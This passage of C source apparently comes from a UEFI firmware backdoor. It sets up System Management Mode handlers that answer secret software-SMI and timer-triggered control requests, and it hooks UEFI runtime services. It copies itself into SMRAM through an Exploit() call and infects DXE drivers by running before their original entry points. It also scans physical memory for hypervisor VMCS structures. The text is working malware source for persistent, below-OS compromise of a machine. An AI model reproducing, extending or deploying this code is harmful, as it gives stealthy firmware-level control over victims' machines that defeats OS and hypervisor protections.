                DbgMsg(__FILE__, __LINE__, "ERROR: Invalid memory address\r\n");

                Ctl.Status = EFI_INVALID_PARAMETER;
                break;
            }

            // size sanity check
            if (SearchSize % PAGE_SIZE != 0 || SearchSize < PAGE_SIZE)
            {
                DbgMsg(__FILE__, __LINE__, "ERROR: Invalid memory size\r\n");

                Ctl.Status = EFI_INVALID_PARAMETER;
                break;
            }

            // get GDT address
            Ctl.Status = SmmCpu->ReadSaveState(
                SmmCpu, sizeof(GdtBase), EFI_SMM_SAVE_STATE_REGISTER_GDTBASE,
                CpuIndex, (VOID *)&GdtBase
            );
            if (EFI_ERROR(Ctl.Status))
            {
                DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Ctl.Status);
                break;
            }

            // get IDT address
            Ctl.Status = SmmCpu->ReadSaveState(
                SmmCpu, sizeof(IdtBase), EFI_SMM_SAVE_STATE_REGISTER_IDTBASE,
                CpuIndex, (VOID *)&IdtBase
            );
            if (EFI_ERROR(Ctl.Status))
            {
                DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Ctl.Status);
                break;
            }

            Ctl.Args.FindVmcs.Found = 0;

            // enumerate all of the memory pages of specified region
            for (i = 0; i < SearchSize; i += PAGE_SIZE)
            {
                UINT64 PageAddr = SearchAddr + i;

                // map physical memoy page at SMM virtual address
                if (PHYS_MAP(PageAddr))
                {
                    UINT8 *TargetAddr = MAPPED_ADDR(PageAddr);

                    // check for valid VMCS region
                    if (*(UINT64 *)TargetAddr == RevisionId)
                    {
                        // scan VMCS region for known values
                        if (VmcsSearchVal(TargetAddr, VMCS_SEARCH_SIZE, GdtBase) &&
                            VmcsSearchVal(TargetAddr, VMCS_SEARCH_SIZE, IdtBase) &&
                            VmcsSearchVal(TargetAddr, VMCS_SEARCH_SIZE, ControlRegs->Cr0))
                        {
                            // potential VMCS was found
                            Ctl.Args.FindVmcs.Found = PageAddr;
                        }
                    }

                    PHYS_REVERT();
                }

                if (Ctl.Args.FindVmcs.Found != 0)
                {
                    // return to the caller
                    Ctl.Status = EFI_SUCCESS;
                    break;
                }
            }

            break;
        }

    default:
        {
            Ctl.Status = EFI_INVALID_PARAMETER;
            break;
        }
    }

_end:

    // map backdoor call arguments at SMM virtual address
    if (PHYS_MAP(ArgsAddr))
    {
        UINT8 *TargetAddr = MAPPED_ADDR(ArgsAddr);

        // copy backdoor call arguments from the local buffer
        std_memcpy(TargetAddr, &Ctl, sizeof(BACKDOOR_CTL));

        PHYS_REVERT();
    }

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
EFI_STATUS EFIAPI SwDispatch2Handler(
    EFI_HANDLE DispatchHandle, CONST VOID *Context,
    VOID *CommBuffer, UINTN *CommBufferSize)
{
    EFI_SMM_SW_CONTEXT *SwContext = (EFI_SMM_SW_CONTEXT *)CommBuffer;
    EFI_SMM_CPU_PROTOCOL *SmmCpu = NULL;
    EFI_STATUS Status = EFI_SUCCESS;

    if (SwContext->DataPort != BACKDOOR_CTL_TIMER_ENABLE)
    {
        DbgMsg(
            __FILE__, __LINE__, __FUNCTION__"(): Command = 0x%x, data = 0x%x\r\n",
            SwContext->CommandPort, SwContext->DataPort
        );
    }

    if ((Status = m_Smst->SmmLocateProtocol(&gEfiSmmCpuProtocolGuid, NULL, (VOID **)&SmmCpu)) == EFI_SUCCESS)
    {
        UINT64 Code = (UINT64)SwContext->DataPort;
        UINTN CpuIndex = SwContext->SwSmiCpuIndex;
        CONTROL_REGS ControlRegs;
        UINT64 Rcx = 0;         

        ControlRegs.Cr0 = ControlRegs.Cr3 = ControlRegs.Cr4 = 0;

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(ControlRegs.Cr0), EFI_SMM_SAVE_STATE_REGISTER_CR0, 
            CpuIndex, (VOID *)&ControlRegs.Cr0
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(ControlRegs.Cr3), EFI_SMM_SAVE_STATE_REGISTER_CR3, 
            CpuIndex, (VOID *)&ControlRegs.Cr3
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(Rcx), EFI_SMM_SAVE_STATE_REGISTER_RCX, 
            CpuIndex, (VOID *)&Rcx
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        if (Code != BACKDOOR_CTL_TIMER_ENABLE)
        {
            DbgMsg(
                __FILE__, __LINE__, __FUNCTION__"(): CPU #%d, code = 0x%llx, arg = 0x%llx\r\n",
                CpuIndex, Code, Rcx
            );
        }

        // handle backdoor control request
        SmmCtlHandle(CpuIndex, SmmCpu, Code, Rcx, &ControlRegs);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "LocateProtocol() ERROR 0x%x\r\n", Status);   
    }

_end:

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
#ifdef USE_PERIODIC_TIMER

EFI_STATUS EFIAPI PeriodicTimerDispatch2Handler(
    EFI_HANDLE DispatchHandle, CONST VOID *Context,
    VOID *CommBuffer, UINTN *CommBufferSize)
{
    EFI_SMM_CPU_PROTOCOL *SmmCpu = NULL;
    EFI_STATUS Status = EFI_SUCCESS;

    if ((Status = m_Smst->SmmLocateProtocol(&gEfiSmmCpuProtocolGuid, NULL, (VOID **)&SmmCpu)) == EFI_SUCCESS)
    {
        UINTN CpuIndex = m_Smst->CurrentlyExecutingCpu;
        CONTROL_REGS ControlRegs;
        UINT64 Rcx = 0, Rdi = 0, Rsi = 0, R8 = 0, R9 = 0;         

        ControlRegs.Cr0 = ControlRegs.Cr3 = ControlRegs.Cr4 = 0;

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(ControlRegs.Cr0), EFI_SMM_SAVE_STATE_REGISTER_CR0, 
            CpuIndex, (VOID *)&ControlRegs.Cr0
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(ControlRegs.Cr3), EFI_SMM_SAVE_STATE_REGISTER_CR3, 
            CpuIndex, (VOID *)&ControlRegs.Cr3
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(Rcx), EFI_SMM_SAVE_STATE_REGISTER_RCX, 
            CpuIndex, (VOID *)&Rcx
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(Rdi), EFI_SMM_SAVE_STATE_REGISTER_RDI, 
            CpuIndex, (VOID *)&Rdi
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(Rsi), EFI_SMM_SAVE_STATE_REGISTER_RSI, 
            CpuIndex, (VOID *)&Rsi
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(R8), EFI_SMM_SAVE_STATE_REGISTER_R8, 
            CpuIndex, (VOID *)&R8
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(R9), EFI_SMM_SAVE_STATE_REGISTER_R9, 
            CpuIndex, (VOID *)&R9
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        /* 
            Check for magic values that was set in smm_call(),
            see smm_call/smm_call.asm for more info.
        */
        if (R8 == BACKDOOR_CALL_R8_VAL && R9 == BACKDOOR_CALL_R9_VAL)
        {            
            DbgMsg(
                __FILE__, __LINE__, __FUNCTION__"(): CPU #%d, code = 0x%llx, arg = 0x%llx\r\n",
                CpuIndex, Rdi, Rsi
            );

            // handle backdoor control request
            SmmCtlHandle(CpuIndex, SmmCpu, Rdi, Rsi, &ControlRegs);

            /* 
                Increment RCX value to quit from the loop:

                    _loop:

                    48 ff ca    dec     rdx
                    74 02       jz      $+4
                    ff e1       jmp     rcx ; _loop

                                ...
            */
            Rcx += 7;
            
            Status = SmmCpu->WriteSaveState(
                SmmCpu, sizeof(Rcx), EFI_SMM_SAVE_STATE_REGISTER_RCX, 
                CpuIndex, (VOID *)&Rcx
            );
            if (EFI_ERROR(Status))
            {
                DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            }
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "LocateProtocol() ERROR 0x%x\r\n", Status);   
    }

_end:

    return EFI_SUCCESS;
}

#endif // USE_PERIODIC_TIMER
//--------------------------------------------------------------------------------------
#ifdef USE_PERIODIC_TIMER

EFI_STATUS EFIAPI PeriodicTimerDispatch2Notify(
    CONST EFI_GUID *Protocol, 
    VOID *Interface, 
    EFI_HANDLE Handle)
{
    m_TimerDispatch = (EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *)Interface;       

    return EFI_SUCCESS;
}

#endif // USE_PERIODIC_TIMER

EFI_STATUS EFIAPI SwDispatch2Notify(
    CONST EFI_GUID *Protocol, 
    VOID *Interface, 
    EFI_HANDLE Handle)
{
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_HANDLE DispatchHandle = NULL;

    EFI_SMM_SW_DISPATCH2_PROTOCOL *SwDispatch = 
        (EFI_SMM_SW_DISPATCH2_PROTOCOL *)Interface;    

    DbgMsg(__FILE__, __LINE__, "Max. SW SMI value is 0x%x\r\n", SwDispatch->MaximumSwiValue);

    // register software SMI handler
    Status = SwDispatch->Register(
        SwDispatch, 
        SwDispatch2Handler, 
        &m_SwDispatchRegCtx,
        &DispatchHandle
    );
    if (Status == EFI_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, "SW SMI handler is at "FPTR"\r\n", SwDispatch2Handler);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "Register() ERROR 0x%x\r\n", Status);
    }

    return EFI_SUCCESS;   
}

VOID BackdoorSmm(EFI_SMM_SYSTEM_TABLE2 *Smst)
{
    VOID *Registration = NULL;
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_PHYSICAL_ADDRESS Addr = 0;     
    EFI_SMM_SW_DISPATCH2_PROTOCOL *SwDispatch = NULL;   

#ifdef USE_PERIODIC_TIMER

    EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *TimerDispatch = NULL;    

#endif

    m_Smst = Smst;

    ConsoleDisable();

    DbgMsg(__FILE__, __LINE__, "Running in SMM\r\n"); 
    DbgMsg(__FILE__, __LINE__, "SMM system table is at "FPTR"\r\n", Smst);            

    // allocate temp buffer
    Status = m_Smst->SmmAllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesData,
        1, &Addr
    );
    if (Status == EFI_SUCCESS)
    {
        m_TempBuff = (UINT8 *)Addr;
    }

    Status = m_Smst->SmmLocateProtocol(
        &gEfiSmmSwDispatch2ProtocolGuid, NULL,
        &SwDispatch
    );
    if (Status == EFI_SUCCESS)
    {
        // protocol is already registered, call notify handler directly
        SwDispatch2Notify(
            &gEfiSmmSwDispatch2ProtocolGuid,
            SwDispatch, NULL
        );
    }
    else
    {
        // wait for the protocol registration
        RegisterProtocolNotifySmm(
            &gEfiSmmSwDispatch2ProtocolGuid,
            SwDispatch2Notify,
            &Registration
        );
    }

#ifdef USE_PERIODIC_TIMER

    Status = m_Smst->SmmLocateProtocol(
        &gEfiSmmPeriodicTimerDispatch2ProtocolGuid, NULL, 
        &TimerDispatch
    );
    if (Status == EFI_SUCCESS)
    {
        // protocol is already registered, call notify handler directly
        PeriodicTimerDispatch2Notify(
            &gEfiSmmPeriodicTimerDispatch2ProtocolGuid,
            TimerDispatch, NULL
        );
    }
    else
    {
        // wait for the protocol registration
        RegisterProtocolNotifySmm(
            &gEfiSmmPeriodicTimerDispatch2ProtocolGuid,
            PeriodicTimerDispatch2Notify,
            &Registration
        );    
    }

#endif // USE_PERIODIC_TIMER

}

VOID BackdoorSmmCall(EFI_SMM_SYSTEM_TABLE2 *Smst)
{
    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
        m_ImageBase,
        ((EFI_IMAGE_DOS_HEADER *)m_ImageBase)->e_lfanew
    );

    UINTN PagesCount = (pHeaders->OptionalHeader.SizeOfImage / PAGE_SIZE) + 1;
    EFI_PHYSICAL_ADDRESS Addr = 0;

    // allocate SMRAM memory for backdoor image
    EFI_STATUS Status = Smst->SmmAllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesData,
        PagesCount,
        &Addr
    );
    if (Status == EFI_SUCCESS)
    {
        VOID *Image = (VOID *)Addr;

        BACKDOOR_ENTRY_SMM Entry = (BACKDOOR_ENTRY_SMM)RVATOVA(
            Image,
            (UINT8 *)BackdoorSmm - (UINT8 *)m_ImageBase
        );

        // copy image to the new location
        m_BS->CopyMem(Image, m_ImageBase, pHeaders->OptionalHeader.SizeOfImage);

        // update image relocations in according to the new address
        LDR_UPDATE_RELOCS(Image, m_ImageBase, Image);

        // execute SMM entry point of the backdoor
        Entry(Smst);
    }
}
//--------------------------------------------------------------------------------------
VOID GenerateSoftwareSMI(UINT8 Data, UINT8 Command)
{
    // fire software SMI using APMC
    __outbyte(APMC_DATA, Data);
    __outbyte(APMC_COMMAND, Command);
}

#ifdef USE_PERIODIC_TIMER

// original address of hooked functions
EFI_GET_NEXT_VARIABLE_NAME old_GetNextVariableName = NULL;
EFI_SET_VIRTUAL_ADDRESS_MAP old_SetVirtualAddressMap = NULL;

VOID EnablePeriodicTimer(VOID)
{
    // communicate with SMM backdoor to enable periodic timer software SMI
    GenerateSoftwareSMI(BACKDOOR_CTL_TIMER_ENABLE, BACKDOOR_SW_SMI_VAL);
}

EFI_STATUS EFIAPI new_GetNextVariableName(
    UINTN *VariableNameSize,
    CHAR16 *VariableName,
    EFI_GUID *VendorGuid)
{
    EnablePeriodicTimer();   

    // call original function
    return old_GetNextVariableName(VariableNameSize, VariableName, VendorGuid);
}

EFI_STATUS EFIAPI new_SetVirtualAddressMap(
    UINTN MemoryMapSize,
    UINTN DescriptorSize,
    UINT32 DescriptorVersion,
    EFI_MEMORY_DESCRIPTOR *VirtualMap)
{
    UINTN i = 0;
    EFI_MEMORY_DESCRIPTOR *MapEntry = VirtualMap;        

    /*
        Copy old function address from the global variable because
        image relocations might be reparsed in this function.
    */
    EFI_SET_VIRTUAL_ADDRESS_MAP Func = old_SetVirtualAddressMap;    

    ConsoleDisable();

    EnablePeriodicTimer();

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");    

    #define FIXUP_ADDR(_addr_) ((EFI_PHYSICAL_ADDRESS)(_addr_) - Addr + MapEntry->VirtualStart)

    #define CHECK_ADDR(_addr_) ((EFI_PHYSICAL_ADDRESS)(_addr_) >= Addr && \
                                (EFI_PHYSICAL_ADDRESS)(_addr_) < (EFI_PHYSICAL_ADDRESS)RVATOVA(Addr, Len))

    // enumerate virtual memory mappings
    for (i = 0; i < MemoryMapSize / DescriptorSize; i += 1)
    {
        UINTN Len = MapEntry->NumberOfPages * PAGE_SIZE;
        EFI_PHYSICAL_ADDRESS Addr = MapEntry->PhysicalStart;

        if (CHECK_ADDR(old_GetNextVariableName))
        {
            // calculate new virtual address of GetNextVariableName()
            old_GetNextVariableName = (EFI_GET_NEXT_VARIABLE_NAME)FIXUP_ADDR(old_GetNextVariableName);
        }

        if (CHECK_ADDR(old_SetVirtualAddressMap))
        {
            // calculate new virtual address of SetVirtualAddressMap()
            old_SetVirtualAddressMap = (EFI_SET_VIRTUAL_ADDRESS_MAP)FIXUP_ADDR(old_SetVirtualAddressMap);
        }
    }

    // enumerate virtual memory mappings
    for (i = 0; i < MemoryMapSize / DescriptorSize; i += 1)
    {
        UINTN Len = MapEntry->NumberOfPages * PAGE_SIZE;
        EFI_PHYSICAL_ADDRESS Addr = MapEntry->PhysicalStart;

        // check for memory region that contants backdoor image
        if (CHECK_ADDR(m_ImageBase))
        {
            VOID *ImageBaseOld = m_ImageBase;

            // calculate new virtual address of backdoor image
            VOID *ImageBaseNew = (VOID *)FIXUP_ADDR(ImageBaseOld);

            DbgMsg(
                __FILE__, __LINE__, 
                "New address of the resident image is "FPTR"\r\n", ImageBaseNew
            );

            m_ImageBase = ImageBaseNew;

            // update image relocations acording to the new address
            LDR_UPDATE_RELOCS(ImageBaseOld, ImageBaseOld, ImageBaseNew);

            break;
        }

        // go to the next entry
        MapEntry = (EFI_MEMORY_DESCRIPTOR *)((UINT8 *)MapEntry + DescriptorSize);
    }

    // call original function
    return Func(MemoryMapSize, DescriptorSize, DescriptorVersion, VirtualMap);
}

VOID BackdoorInitRuntimeHooks(VOID)
{
    // hook GetNextVariableName() runtime function
    old_GetNextVariableName = m_RT->GetNextVariableName;
    m_RT->GetNextVariableName = new_GetNextVariableName;

    // hook SetVirtualAddressMap() runtime function
    old_SetVirtualAddressMap = m_RT->SetVirtualAddressMap;
    m_RT->SetVirtualAddressMap = new_SetVirtualAddressMap;
}

#endif // USE_PERIODIC_TIMER

VOID BackdoorResidentCommon(VOID *Image)
{
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_SMM_ACCESS2_PROTOCOL *SmmAccess2 = NULL;
    UINTN i = 0;

    // update image base address
    m_ImageBase = Image;

    // for debug messages output on the screen
    SimpleTextOutProtocolNotifyRegister();

#ifdef USE_PERIODIC_TIMER

    // install hooks to enable periodic timer during RT phase
    BackdoorInitRuntimeHooks();

#endif

    // locate SMM access 2 protocol
    if ((Status = m_BS->LocateProtocol(&gEfiSmmAccess2ProtocolGuid, NULL, (VOID **)&SmmAccess2)) == EFI_SUCCESS)
    {        
        DbgMsg(__FILE__, __LINE__, "SMM access 2 protocol is at "FPTR"\r\n", SmmAccess2);
        DbgMsg(__FILE__, __LINE__, "Available SMRAM regions:\r\n");

        m_SmramMapSize = sizeof(m_SmramMap);

        // get SMRAM regions information
        if ((Status = SmmAccess2->GetCapabilities(SmmAccess2, &m_SmramMapSize, m_SmramMap)) == EFI_SUCCESS)
        {
            for (i = 0; i < m_SmramMapSize / sizeof(EFI_SMRAM_DESCRIPTOR); i += 1)
            {
                DbgMsg(
                    __FILE__, __LINE__, " * 0x%.8llx:0x%.8llx\r\n", 
                    m_SmramMap[i].PhysicalStart,
                    m_SmramMap[i].PhysicalStart + m_SmramMap[i].PhysicalSize - 1
                );
            }

            if (m_SmramMapSize > 0)
            {
                /*
                    Use beginnig of the SMRAM as dummy page for VirtualAddrRemap()
                */
                m_DummyPage = m_SmramMap[0].PhysicalStart;
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "GetCapabilities() ERROR 0x%x\r\n", Status);

            m_SmramMapSize = 0;
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "LocateProtocol() ERROR 0x%x\r\n", Status);
    }
}
//--------------------------------------------------------------------------------------
VOID BackdoorResidentDma(VOID *Image)
{
    PINFECTOR_STATUS Status = (PINFECTOR_STATUS)(INFECTOR_STATUS_ADDR);

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");

    // perform common initialization
    BackdoorResidentCommon(Image);

    // report sucessfully executed DXE driver
    Status->Success += 1;

    // run exploit to load backdoor into SMRAM and execute its entry point
    Exploit(BackdoorSmmCall);
}
//--------------------------------------------------------------------------------------
VOID BackdoorResidentInfector(VOID *Image)
{
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_SMM_BASE2_PROTOCOL *SmmBase = NULL;    

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");

    // perform common initialization
    BackdoorResidentCommon(Image);

    // locate SMM base protocol
    if ((Status = m_BS->LocateProtocol(&gEfiSmmBase2ProtocolGuid, NULL, (VOID **)&SmmBase)) == EFI_SUCCESS)
    {
        BOOLEAN bInSmm = FALSE;        

        // check if we're currently running in SMM
        SmmBase->InSmm(SmmBase, &bInSmm);

        if (bInSmm)
        {
            EFI_SMM_SYSTEM_TABLE2 *Smst = NULL;

            if ((Status = SmmBase->GetSmstLocation(SmmBase, &Smst)) == EFI_SUCCESS)
            {
                // load backdoor into the SMRAM and execute its entry point
                BackdoorSmmCall(Smst);
            }   
            else
            {
                DbgMsg(__FILE__, __LINE__, "GetSmstLocation() ERROR 0x%x\r\n", Status);
            }
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "LocateProtocol() ERROR 0x%x\r\n", Status);
    }
}
//--------------------------------------------------------------------------------------
void BackdoorEntryCall(EFI_SYSTEM_TABLE *SystemTable, BACKDOOR_ENTRY_RESIDENT EntryProc)
{
    VOID *Image = NULL;

    m_ST = SystemTable;
    m_BS = SystemTable->BootServices;
    m_RT = SystemTable->RuntimeServices;

#if defined(BACKDOOR_DEBUG_SERIAL)

    // initialize serial port I/O for debug messages
    SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);

#endif        

#if defined(BACKDOOR_DEBUG)

    // initialize text output
    ConsoleInitialize();

    DbgMsg(__FILE__, __LINE__, "******************************\r\n");
    DbgMsg(__FILE__, __LINE__, "                              \r\n");
    DbgMsg(__FILE__, __LINE__, "  SMM backdoor loaded         \r\n");
    DbgMsg(__FILE__, __LINE__, "                              \r\n");
    DbgMsg(__FILE__, __LINE__, "******************************\r\n");

#endif
    
    // copy image to the new location
    if ((Image = ImageRelocate(m_ImageBase)) != NULL)
    {
        BACKDOOR_ENTRY_RESIDENT Entry = (BACKDOOR_ENTRY_RESIDENT)RVATOVA(
            Image,
            (UINT8 *)EntryProc - (UINT8 *)m_ImageBase
        );
        
        DbgMsg(__FILE__, __LINE__, "Resident code base address is "FPTR"\r\n", Image);
        
        // execute backdoor resident code
        Entry(Image);
    } 
}
//--------------------------------------------------------------------------------------
EFI_STATUS EFIAPI BackdoorEntryDma(EFI_GUID *Protocol, VOID *Registration, VOID **Interface)
{
    EFI_LOCATE_PROTOCOL LocateProtocol = NULL;
    EFI_SYSTEM_TABLE *SystemTable = NULL;
    VOID *Base = NULL;

    // get backdoor image base address
    if ((Base = ImageBaseByAddress(get_addr())) == NULL)
    {
        return EFI_SUCCESS;
    }

    // setup correct image relocations
    if (!LdrProcessRelocs(Base, Base))
    {
        return EFI_SUCCESS;   
    }    

    m_ImageBase = Base;  

    LocateProtocol = (EFI_LOCATE_PROTOCOL)m_InfectorConfig.LocateProtocol;
    SystemTable = (EFI_SYSTEM_TABLE *)m_InfectorConfig.SystemTable;    

    if (LocateProtocol != NULL)
    {
        // remove LocateProtocol() hook
        SystemTable->BootServices->LocateProtocol = LocateProtocol;
    }

    // call the backdoor
    BackdoorEntryCall(SystemTable, BackdoorResidentDma);    

    if (LocateProtocol != NULL)
    {
        // call original function
        return LocateProtocol(Protocol, Registration, Interface);
    }

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
EFI_STATUS EFIAPI BackdoorEntryInfected(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{
    VOID *Base = NULL;
    EFI_LOADED_IMAGE *LoadedImage = NULL;

    // get backdoor image base address
    if ((Base = ImageBaseByAddress(get_addr())) == NULL)
    {
        return EFI_SUCCESS;
    }

    // setup correct image relocations
    if (!LdrProcessRelocs(Base, Base))
    {
        return EFI_SUCCESS;   
    }    

    m_ImageBase = Base;  

    // call the backdoor
    BackdoorEntryCall(SystemTable, BackdoorResidentInfector);    

    // get current image information
    m_BS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID *)&LoadedImage);  

    if (LoadedImage && m_InfectorConfig.OriginalEntryPoint != 0)
    {
        EFI_IMAGE_ENTRY_POINT Entry = (EFI_IMAGE_ENTRY_POINT)RVATOVA(
            LoadedImage->ImageBase,
            m_InfectorConfig.OriginalEntryPoint
        );

        // call original entry point
        return Entry(ImageHandle, SystemTable);
    }

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
EFI_STATUS EFIAPI _ModuleEntryPoint(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) 
{
    // ...

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
// EoF
